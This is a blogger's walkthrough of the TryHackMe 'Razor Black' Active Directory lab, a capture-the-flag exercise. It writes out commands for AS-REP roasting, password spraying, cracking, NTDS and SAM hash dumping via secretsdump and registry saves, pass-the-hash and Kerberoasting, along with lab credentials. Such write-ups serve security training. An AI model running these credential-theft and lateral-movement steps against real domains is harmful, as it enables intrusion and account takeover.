---
title: Razor Black
date: 2022-01-01 12:00:00 -500
categories: [CTF writeups,tryhackme]
tags: [privesc,active directory]
---

## Razor Black Active Directory Writeup

### These guys call themselves hackers. Can you show them who’s the boss ??

![](https://cdn-images-1.medium.com/max/3840/1*gb0lOeaxAujKFNf4NX_OuA.png)

## ✅ ENUMERATION :

### **➡️ Rustscan**

let's start with an enumeration of open ports, I will be using rustscan as always, then then we will run NMAP.

![](https://cdn-images-1.medium.com/max/2000/1*yhzbE5E5P87btLIb0AewZA.png)

### **➡️ Nmap**

now lets run the NMAP to get more details.

    root@kali ~ » nmap -sC -Pn 10.10.247.219 -T 5                                                                                                                                                                      
    Starting Nmap 7.93 ( [https://nmap.org](https://nmap.org) ) at 2022-11-07 09:07 EST                                                                                                                                                    
    Nmap scan report for 10.10.247.219                                                                                                                                                                                 
    Host is up (0.15s latency).                                                                                                                                                                                        
    Not shown: 986 closed tcp ports (reset)                                                                                                                                                                            
    PORT     STATE SERVICE                                                                                                                                                                                             
    53/tcp   open  domain                                                                                                                                                                                              
    88/tcp   open  kerberos-sec                                                                                                                                                                                        
    111/tcp  open  rpcbind                                                                                                                                                                                             
    | rpcinfo:                                                                                                                                                                                                         
    |   program version    port/proto  service                                                                                                                                                                         
    |   100000  2,3,4        111/tcp   rpcbind                                                                                                                                                                         
    |   100000  2,3,4        111/tcp6  rpcbind                                                                                                                                                                         
    |   100000  2,3,4        111/udp   rpcbind                                                                                                                                                                         
    |   100000  2,3,4        111/udp6  rpcbind                                                                                                                                                                         
    |   100003  2,3         2049/udp   nfs                                                                                                                                                                             
    |   100003  2,3         2049/udp6  nfs                                                                                                                                                                             
    |   100003  2,3,4       2049/tcp   nfs                                                                                                                                                                             
    |   100003  2,3,4       2049/tcp6  nfs                                                                                                                                                                             
    |   100005  1,2,3       2049/tcp   mountd                                                                                                                                                                          
    |   100005  1,2,3       2049/tcp6  mountd                                                                                                                                                                          
    |   100005  1,2,3       2049/udp   mountd                                                                                                                                                                          
    |   100005  1,2,3       2049/udp6  mountd                                                                                                                                                                          
    |   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                                                                   
    |   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                                                   
    |   100021  1,2,3,4     2049/udp   nlockmgr                                                                                                                                                   
    |   100021  1,2,3,4     2049/udp6  nlockmgr                                                                                                                                                   
    |   100024  1           2049/tcp   status                                                                                                                                   
    |   100024  1           2049/tcp6  status                                                                                                                                   
    |   100024  1           2049/udp   status                                                                                                                                   
    |_  100024  1           2049/udp6  status                                                                                                                                   
    135/tcp  open  msrpc                                                                                                                                                        
    139/tcp  open  netbios-ssn                                                                                                                                                  
    389/tcp  open  ldap                                                                                                                                                         
    445/tcp  open  microsoft-ds                                                                                                                                                 
    464/tcp  open  kpasswd5                                                                                                                                                     
    593/tcp  open  http-rpc-epmap                                                                                                                                               
    636/tcp  open  ldapssl                                                                                                                                                      
    2049/tcp open  mountd                                                                                                                                                       
    3268/tcp open  globalcatLDAP                                                                                                                                                
    3269/tcp open  globalcatLDAPssl                                                                                                                                             
    3389/tcp open  ms-wbt-server                                                                                                                                                
    | rdp-ntlm-info:                                                                                                                                                            
    |   Target_Name: RAZ0RBLACK                                                                                                                                                 
    |   NetBIOS_Domain_Name: RAZ0RBLACK                         
    |   NetBIOS_Computer_Name: HAVEN-DC                         
    |   DNS_Domain_Name: raz0rblack.thm                                                                                     
    |   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm                                                  
    |   Product_Version: 10.0.17763                                                                                                          
    |_  System_Time: 2022-11-07T14:08:01+00:00                                      
    |_ssl-date: 2022-11-07T14:08:00+00:00; +5s from scanner time.                                                           
    | ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm                         
    | Not valid before: 2022-11-06T13:58:28                                                                                 
    |_Not valid after:  2023-05-08T13:58:28                                                         
                                                                                                                                             
    Host script results:                                                
    | smb2-security-mode:                   
    |   311:                                                                        
    |_    Message signing enabled and required                                                      
    | smb2-time:                            
    |   date: 2022-11-07T14:08:04           
    |_  start_date: N/A                                                             
    |_clock-skew: mean: 4s, deviation: 0s, median: 4s                                               
                                                                                    
    Nmap done: 1 IP address (1 host up) scanned in 41.33 seconds

From the above result, we found that the domain name is: raz0rblack.thm

now add the domain name with a respective IP address in /etc/hostfile

### ➡️ SMB enumeration

I will start enumeration with SMB because there are likely more chances of finding something useful there.

let's start with **smbmap :**

![](https://cdn-images-1.medium.com/max/2000/1*0F-YVx5hWtWef3nPIJSiTw.png)

we got nothing !!

let's use another tool, like **smbclient** to list the shares :

![](https://cdn-images-1.medium.com/max/2914/1*1Eq1qaM7rq5BTeyDx8QdjA.png)

it shows that there is no workgroup available

### ➡️ NFS enumeration

From the NMAP result, we have found that port 2049 is open which is of NFS (network file sharing)

For the remote shares that are available in NFS, we can use **showmount**

![](https://cdn-images-1.medium.com/max/2000/1*gIYPRpFiGaM_Did7KkvNUw.png)

here -eoption is for exporting the list of shares.

we see we have /userslet’s mount that share on our machine.

![](https://cdn-images-1.medium.com/max/2824/1*iMAD-XMuf1efKdneaS1l2w.png)

    mkdir /mnt/remote && mount -t nfs 10.10.102.12:/users /mnt/remote

![](https://cdn-images-1.medium.com/max/2000/1*Y8qFmrRJUVf4IV1nvOhQoQ.png)

here we have two files, in which one file sbradley.txt is the THM flag and the other is the Xls file. so, we need to figure a way out to view document files like Xls in the Linux command line.

we can use the power of python like so :

    import pandas as pd

    #read the xls file and convert into dataframe object

    df = pd.DataFrame(pd.read_excel("/mnt/remote/employee_status.xlsx"))

    #show dataframe

    print(df)

![](https://cdn-images-1.medium.com/max/3590/1*bb2toKDvUFS9q-kIZ83__w.png)

so, we have a couple of usernames, let's create a list of these users

![](https://cdn-images-1.medium.com/max/2000/1*dzTcqEevBaVLxyNjWkcYIQ.png)

these are the users !! Let's first start with asreproasting attack

➡️ AS_ REP Roasting attack

    impacket-GetNPUsers raz0rblack.thm/ -usersfile usernames.txt -format hashcat

![](https://cdn-images-1.medium.com/max/3896/1*6HiMGRVtDRj0a6aZbN5qIA.png)

we have asrep_rosating available for twilliam

let's crack it with hashcat

![](https://cdn-images-1.medium.com/max/3852/1*DtXcu1qSqvced55Z1GWacQ.png)

let's see if we can evil-winrm but we didn’t get anything . so, I started the enumeration process again. lets again start with SMB.

![](https://cdn-images-1.medium.com/max/3512/1*B6-RpW4hkmF5ImAi-cGfjQ.png)

we have READ access to some folders, one of the folders is IPC$ , which means we can brute force the RID to find all users.

we can use impacket-lookupsidimpacket utility to Bruteforce the users like so :

    impacket-lookupsid 'twilliams:roastpotatoes'[@10](http://twitter.com/10).10.115.117

we get a couple of new users, which was not there in our earlier username wordlist.

![](https://cdn-images-1.medium.com/max/2000/1*nKO8Kl8gzJYE1VzAenHm9g.png)

add the new users who have **SidTypeUser **to our wordlist.

![](https://cdn-images-1.medium.com/max/2000/1*cuZcNIoJcC_WPWRUoa9JHQ.png)

➡️ Password spraying

now that we have a list of a valid users, and one password, which we got by AS_rep roasting. let's try to spray that.

we can use crackmapexec for that.

![](https://cdn-images-1.medium.com/max/3876/1*3d1im5BCEfcafFjgRyepug.png)

we have **sbradly **user, which has **STATUS_PASWORD_MUST_CHANGE**

now we can use the utility **smbpasswd **to change the password of a user in smb like so :

![](https://cdn-images-1.medium.com/max/2000/1*rsiH3n7bzSuy1IT_57zTiA.png)

so, now we have changed the password of sbradley user. I again tried evil-winrm into the machine but was not successful. so, let's start the enumeration process again. this time we will be going to enumerate the shares with our new user and the new password that we have set

![](https://cdn-images-1.medium.com/max/3054/1*7azRNUqOQY2q19LuPShQsg.png)

as you can now see we have a new share that we have READ access to.

let’s see what's inside it.

![](https://cdn-images-1.medium.com/max/2274/1*WG09mBaN8FqRp_usnyKvBQ.png)

we have a couple of files, which we also have a file sbradley.txt

that contains steven’s flag, that we found earlier in NFS.

now let's read that chat file :

![](https://cdn-images-1.medium.com/max/3872/1*xSL710ZzaJ_IL5rQZpilLg.png)

by reading the file we get to know that there is zerologon vulnerability on DC, which sbradley has taken advantage of. he has dumped the ntds.dit and SYSTEM.hive in the trash share in zip format, let's dump that.

that file is **experiment_gone_wrong.zip**

get experiment_gone_wrong.zip

    mkdir /root/Desktop/trash &&  mount -t cifs -o 'username=sbradley,password=password@123' //10.10.84.149/trash /root/Deskt
    op/trash

after dumping the file, we tried to unzip it, but it was found that it is password protected.

![](https://cdn-images-1.medium.com/max/2000/1*0CsTHHH-yB1b_ZN9y8M7yg.png)

so, let's try to crack it with john the ripper, but first, let's convert it to the format that john the ripper is compatible with :

![](https://cdn-images-1.medium.com/max/3840/1*xE6Z2xg2Z4PgA14iYObpHQ.png)

now let's try to crack it with the rockyou.txt file :

![](https://cdn-images-1.medium.com/max/2830/1*KWEycpMwjMWNaT3bjhpipw.png)

and it cracked the password in seconds. now we can get ntds.dit and system.hive file

![](https://cdn-images-1.medium.com/max/2000/1*cQx9axVUBx9slzdHgdl8PQ.png)

now we can read it with help of secretdump like so :

    impacket-secretsdump -ntds ntds.dit -system system.hive local > hashes.txt

now we got hashes for all the users !!

but the hashes for the users that are being asked in the CTF are I think local accounts because these account hashes were not found in the above file.

but we have hashes for administrator, on which the DC has by default PSRemoting enable, so possibly we can use evil-winrm to login.

for some reason, I don't know I was not even able to log in to the Administrator account may be that is not a local admin!!

so, now we need to perform a pass-the-hash attack. on the tryhackme they have asked for Ljudmila’s Hash which is of Pretoria user, we found it earlier in our username wordlist, but that user’s name is not there in the dump we have made from the zip file.

we could possibly try to pass the hash.

let's create a proper list of all the hashes we got from the dump.

remove the unnecessery thing from the top of output from the impacket. and format hashs.txt like so :

    cat hashes.txt | cut -d ":" -f 4 > clean_hash.txt

now let's use crackmapexec to pass the hash

    crackmapexec smb <ip> -u lvetrova -H clean_hash.txt

![](https://cdn-images-1.medium.com/max/3840/1*kSplkoPEPGAoArmQlyulhg.png)

now as you can see we got the right hashes for lvetrova user.

now we would again try to login with hash using evil-winrm :

![](https://cdn-images-1.medium.com/max/3870/1*QIrqWOEDa_EeB-udF-YFIg.png)

now as you can see we got a successful hit with evil-winrm. on searching locally, we have found that there is no flag on Desktop, but in the user directory, we have found a file lvetrova.xml. that file was containing some encrypted password. on googling I have found a way to decrypt it.

![](https://cdn-images-1.medium.com/max/2010/1*ehetI-iLwL02lDWcuXt9iA.png)

so, the command we will be used to decrypt that XML file would be :

    $credential = Import-Clixml -Path lvetrova.xml
    $credential.GetNetworkCredential().password

![](https://cdn-images-1.medium.com/max/2672/1*vTB1hYlXUn9vl7yW90PwZg.png)

and we got the flag of that user !!!

now that we have a valid credential, we could possibly enumerate the host for privilege escalation vulnerability or can do kerbroasting.

![](https://cdn-images-1.medium.com/max/3808/1*4gvAT-WkBLo5iXY3QUhX2A.png)

we got one user on which we can perform kerberoasting

let's request the ticket.

![](https://cdn-images-1.medium.com/max/3876/1*uCY964D-MvBYKJMgTBH4yQ.png)

and we got the ticket for xyna1d3 user !!

let's try to crack it :

    hashcat.exe -m 13100 <ticket_hash> -O

![](https://cdn-images-1.medium.com/max/3782/1*7Blit-E415GXnmuuaFXmWQ.png)

and we got the password for that user !!

let's try to get an evil winrm shell with this password.

![](https://cdn-images-1.medium.com/max/3848/1*8e5KOCtDnIUGVeiHGAcxmA.png)

and we got access

again, we get an XML file for that user, which is saving the flag in an encrypted manner !!

let's crack them like earlier :

    $credential = Import-Clixml -Path lvetrova.xml
    $credential.GetNetworkCredential().password

![](https://cdn-images-1.medium.com/max/2238/1*QfMrNm6zknx-hqbzVBkSNg.png)

now we have only left with a root flag, which means we possibly have to find a privilege vulnerability on the machine.

first, I tried to upload winpeas to find privesc vector. but it was found that there is an antivirus/AMSI (antimalware service interface) running on the system PowerShell, so I was not able to run the script.

so, i tried to look at all the privileges i have with

whoami /all

and I found something interesting:

![](https://cdn-images-1.medium.com/max/2716/1*TbyTtS1oTU0cJz9enKb6YQ.png)

since the backup operator has full read access to any file which also bypass the ACL set by the administrator.

we can simply download the SAM and SYSTEM file from the registry like so :

reg save hklm\sam C:\Temp\sam

reg save hklm\system C:\Temp\system

![](https://cdn-images-1.medium.com/max/2272/1*h98IKSwgJ-S1dGyB8rNMTQ.png)

![](https://cdn-images-1.medium.com/max/2302/1*7tgMA2THrS20bBukRDm6tA.png)

after dumping both file we can use impacket’s secretdump to dump the hashes of the files.

![](https://cdn-images-1.medium.com/max/3540/1*eZMW9lzli0UU7WMeNsxAyw.png)

![](https://cdn-images-1.medium.com/max/3160/1*2pTJhBafmrkU9Fg4cU6f2Q.png)

again just like other flags we have root.xml file and the flag is in secure string format

    $credential = Import-Clixml -Path lvetrova.xml

but this time we got an error !! that data invalid let's examine the file

![](https://cdn-images-1.medium.com/max/3798/1*MrsMoxRW7LXXSTDT9XPNFA.png)

now let's try to slap that password data in cyberchef to see what’s the real content !!

![](https://cdn-images-1.medium.com/max/3124/1*yw8FL8V_jEAU34YbiZDYnw.png)

we now got our final flag !!!!

now for finding the Tyson flag , we moved to his directory twilliams , there we find a wired Exe file , I first tried to run it but it did’nt run , so i then tried to check the content for that file

![](https://cdn-images-1.medium.com/max/3838/1*zX4h7hmaXUxBEN5sL1xfIg.png)

and we the flag for that user.

now we need to find the top secret, so after enumerating for a bit I run the following command :

![](https://cdn-images-1.medium.com/max/2868/1*sf0gItzLmwpOvEjp4Hef6w.png)

which gives me a link to this image file, i downloaded it and it was like :

![](https://cdn-images-1.medium.com/max/2000/1*Y5Fd_9EWaQZqwuU7yvwupQ.png)

so, you know the rest of the answers!!!

we completed the challenge !!!

![](https://cdn-images-1.medium.com/max/2000/1*JXw65cehAhYsUhjmt6FzZQ.gif)

THANK YOU FOR READING MY ARTICLE !! 👊👊

please support me by following me on medium and other social platforms:

[https://surya-dev.medium.com/](https://surya-dev.medium.com/)

[https://twitter.com/kryolite_secure](https://twitter.com/kryolite_secure)/

https://[www.instagram.com/kryolite_security/](http://www.instagram.com/kryolite_security/)

[https://github.com/surya-dev-singh/](https://github.com/surya-dev-singh/)

you guys can subscribe to me 🙌on YouTube: **I post walkthroughs and other ethical hacking-related videos there.**
[**Kryolite Security**
*Hello World! On Kryolite Security you will find videos on ethical hacking , cyber security , penetration testing , CTFs…*www.youtube.com](https://www.youtube.com/channel/UCNKXlqfPevPg2Cv1R5YZ6Jw)
[**Dark Web Introduction**
*This will be the first blog of the Dark Web Documentary Series*systemweakness.com](https://systemweakness.com/dark-web-introduction-8d965a8e68e2)
[**Nmap — The Complete Guide [Part 1]**
*reconnaissance with Nmap — the complete guide*systemweakness.com](https://systemweakness.com/nmap-the-complete-guide-part-1-4f6464c94edd)
[**Steel Mountain [TryHackMe]**
*Hack into a Mr. Robot-themed Windows machine. Use Metasploit for initial access, utilize PowerShell for Windows…*systemweakness.com](https://systemweakness.com/steel-mountain-tryhackme-ab22711fe3c7)
[**Dirty Pipe: CVE-2022–0847 [TryHackMe]**
*tryhackme walkthrough for Interactive lab for exploiting Dirty Pipe (CVE-2022–0847) in the Linux Kernel*systemweakness.com](https://systemweakness.com/dirty-pipe-cve-2022-0847-tryhackme-7a652910596b)

### From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. [Join our weekly newsletter](https://weekly.infosecwriteups.com/) to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!
